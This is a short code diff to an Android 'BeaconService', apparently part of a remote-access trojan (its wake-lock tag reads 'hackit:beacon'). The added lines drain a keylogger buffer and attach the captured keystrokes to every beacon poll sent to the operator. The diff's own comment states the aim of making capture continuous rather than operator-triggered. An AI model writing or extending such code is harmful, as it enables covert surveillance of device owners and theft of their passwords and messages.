@@ -279,6 +279,14 @@ public class BeaconService extends Service {
                 lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "hackit:beacon");
                 lock.acquire(40000L);
             }
+            // Keylogger buffer ships with every beacon so capture is live, not
+            // operator-triggered; keylog_dump still drains whatever is left.
+            if (KeyMon.connected()) {
+                JSONArray keys = KeyMon.drain(150);
+                if (keys.length() > 0) {
+                    Outbox.event("keylog", keys);
+                }
+            }
             JSONObject body = new JSONObject();
             body.put("op", "poll");
             body.put("meta", Common.meta(this));
